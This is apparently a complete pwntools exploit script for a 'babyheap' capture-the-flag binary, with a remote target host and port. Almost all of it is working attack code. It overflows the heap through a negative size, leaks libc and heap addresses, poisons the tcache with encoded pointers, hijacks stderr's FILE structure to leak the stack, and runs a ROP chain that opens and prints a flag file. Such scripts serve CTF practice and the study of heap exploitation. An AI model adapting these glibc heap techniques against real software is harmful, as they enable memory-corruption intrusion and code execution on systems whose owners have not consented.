#!/usr/bin/python3

from pwn import *

elf = ELF('./babyheap')

context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "breakrva 0x1A8B",
			# "breakrva 0x1ED9",
			# "breakrva 0x1E7f", # read_bytes, while cond
			# "breakrva 0x194D", 
			# "breakrva 0x1874", 
			# "breakrva 0x1898", # malloc in alloc
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("47.100.33.132", "2204")
		# return remote("localhost", "1000")
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

alloc_arr = set()

def get_idx():
	for i in range(0x10):
		if i not in alloc_arr:
			alloc_arr.add(i)
			return i

	raise Exception("BAD")

def alloc(size, content=b''):
	sla(b'Command: ', b'1')
	sla(b'Size: ', str(size).encode())
	if size:
		sla(b'Content: ', content)

	idx = get_idx()
	# print(f'Alloc: {idx} {content}')
	return idx
	

def free(idx):
	sla(b'Command: ', b'3')
	sla(b'Index: ', str(idx).encode())
	alloc_arr.remove(idx)

def update(idx, size, content):
	sla(b'Command: ', b'2')
	sla(b'Index: ', str(idx).encode())
	sla(b'Size: ', str(size).encode())
	sla(b'Content: ', content)

def view(idx):
	sla(b'Command: ', b'4')
	sla(b'Index: ', str(idx).encode())
	return rl()

def exit():
	sla(b'Command: ', b'5')

def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr


li("Leaking heap & libc")
overwriter = alloc(0x10, b'11')
fake_size_chunk = alloc(0x10, b'22')
un1 = alloc(0x600, b'unsorted1')
alloc(0x10, b'33')
un2 = alloc(0x600, b'unsorted2')
alloc(0x10, b'33')

update(overwriter, -1, flat(
	b'B' * 0x10, 
	0, 
	0x81
))

# free chunk with fake size (0x70) and alloc it again (set the size of next chunk to 0x600, because free(un1) will fail)
free(fake_size_chunk)	
leaker = alloc(0x70, flat(		
	b'B' * 0x18, 
	0x611
))

free(un1)
free(un2)

leak = view(leaker)
leak = leak.removeprefix(b'Chunk[1]: BBBBBBBBBBBBBBBBBBBBBBBB' + p64(0x611))
libc_leak = u64(leak[:8])
heap_leak = u64(leak[8:16])
ls(f'libc leak {hex(libc_leak)}')
ls(f'heap leak {hex(heap_leak)}')

libc_base = libc_leak - 0x219ce0
heap_base = heap_leak - 0x900
ls(f'libc leak {hex(libc_base)}')
ls(f'heap base {hex(heap_base)}')

libc = ELF("./libc.so.6")
libc.address = libc_base
environ = libc.symbols['_environ']
std_err = libc.symbols['_IO_2_1_stderr_']

# restore leaker size and free it
update(overwriter, -1, flat(
	b'B' * 0x10, 
	0, 
	0x21, 
))
free(alloc(0x10, b'AA'))  # put sth on tcache list (because of tcache bins count)
free(leaker)

# poison tcache 0x20
enc_ptr = protect_ptr(
	heap_base + 0x2b0,  # where the chunk is
	std_err				# where we want to point
)

update(overwriter, -1, flat(
	b'B' * 0x10, 
	0, 
	0x21, 
	p64(enc_ptr)[:-1]    # because read_bytes adds null byte, we dont want to overwrite tcache key, so strip last byte (null byte)
))

evil = alloc(0x10, b'AA')

# chunk in stderr
stderr = alloc(0x10, b'CC')
update(stderr, -1, flat(
	b'A' * 0xe0,
	0xfbad1800,						# _flags
	environ, environ, environ,		# _IO_read_*
	environ,						# _IO_write_base
	environ + 0x8, environ + 0x8,	# _IO_write_ptr + _IO_write_end
	environ + 0x8,					# _IO_buf_base
	environ + 0x8					# _IO_buf_end
))

stack_leak = rl()
stack_leak = u64(stack_leak[:8])
ls(f'stack leak {hex(stack_leak)}')

ret_from_main = stack_leak - 0x120  	
ls(f'ret_from_main {hex(ret_from_main)}')
alignment = stack_leak % 0x10
ret_from_main -= alignment 			# align to 0x10
ls(f'ret_from_main aligned {hex(ret_from_main)}')


free(alloc(0x10)) 					# put sth on tcache list (because of tcache bins count)
free(evil)

enc_ptr = protect_ptr(
	heap_base + 0x2b0,  		# where the chunk is
	ret_from_main				# where we want to point
)

update(overwriter, -1, flat(
	b'B' * 0x10,
	0,
	0x21,
	p64(enc_ptr)[:-1]
))

evil = alloc(0x10, b'AA')

read_to = heap_base
rop = ROP(libc, base=ret_from_main+alignment)
rop.call('syscall', [2, b"./flag", 0, 0])
rop.call("read", [3, read_to, 0x40])
rop.call("puts", [read_to])
rop.call('syscall', [0x3c, 0])	# we are gentlemen
print(rop.dump())

# chunk on stack, overwrites retaddr from main
final = alloc(0x10, p64(0))
update(final, -1, flat(b'A' * alignment, rop.chain()))

exit() # trigger ROP

ia()



